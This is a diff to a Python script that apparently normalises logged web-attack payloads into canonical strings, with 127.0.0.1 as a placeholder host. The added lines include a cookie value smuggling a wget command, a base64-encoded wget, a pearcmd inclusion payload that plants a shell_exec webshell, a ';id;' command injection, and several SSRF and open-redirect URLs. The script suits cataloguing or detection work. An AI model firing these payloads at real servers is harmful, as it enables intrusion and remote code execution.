@@ -80,7 +80,8 @@ for doing in doings:
     elif doing == "cookie":
         findings = [_ for _ in findings if not _.startswith("d2dldCBodHR")]
         findings.append("d2dldCBodHRwOi8vMTI3LjAuMC4xLw==")
-        pass # Nothing to do yet
+        findings = [_ for _ in findings if not _.startswith("sessionid='`wget ")]
+        findings.append("sessionid='`wget http://127.0.0.1`'")
     elif doing == "from":
         pass # Nothing to do yet
     elif doing == "keep-alive":
@@ -150,8 +151,24 @@ for doing in doings:
         findings.append("owa/auth/logon.aspx?url=http://127.0.0.1/ecp")
         findings = [_ for _ in findings if not "autodiscover/autodiscover.json" in _.lower()]
         findings.append("autodiscover/autodiscover.json?a=a@127.0.0.1/ews/exchange.asmx")
-        
-
+        findings = [_ for _ in findings if not "111/rs:fit:400:400:0:0/plain/" in _.lower()]
+        findings.append("111/rs:fit:400:400:0:0/plain/http://127.0.0.1")
+        findings = [_ for _ in findings if not "adm/krgourl.php?DOCUMENT_ROOT=http://" in _]
+        findings.append("adm/krgourl.php?DOCUMENT_ROOT=http://127.0.0.1")
+        findings = [_ for _ in findings if not "homeautomation_v3_3_2/api.php?do=groups/toggle&groupid=1&status=1&redirect=" in _.lower()]
+        findings.append("homeautomation_v3_3_2/api.php?do=groups/toggle&groupid=1&status=1&redirect=https://127.0.0.1/")
+        findings = [_ for _ in findings if not "index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?shell_exec(base64_de" in _.lower()]
+        findings.append("index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?shell_exec(base64_decode(\"aWQ=\"));?>+/tmp/ohhellohttpserver.php")
+        findings = [_ for _ in findings if not "orchard/Users/Account/LogOff?ReturnUrl=" in _]
+        findings.append("orchard/Users/Account/LogOff?ReturnUrl=%2f%2fhttp://127.0.0.1%3f")
+        findings = [_ for _ in findings if not "resolve?name=" in _]
+        findings.append("resolve?name=google.com")
+        findings = [_ for _ in findings if not "search.php?search=%22" in _]
+        findings.append("search.php?search=%22;id;%22")
+        findings = [_ for _ in findings if not "wp-content/plugins/phastpress/phast.php?service=scripts&src=" in _]
+        findings.append("wp-content/plugins/phastpress/phast.php?service=scripts&src=https%3A%2F%2F127.0.0.1")
+        findings = [_ for _ in findings if not "modules/babel/redirect.php?newurl=" in _]
+        findings.append("modules/babel/redirect.php?newurl=http://127.0.0.1")
         """
         findings = [_ for _ in findings if not "TEMPLATE" in _]
         findings.append("TEMPLATE")
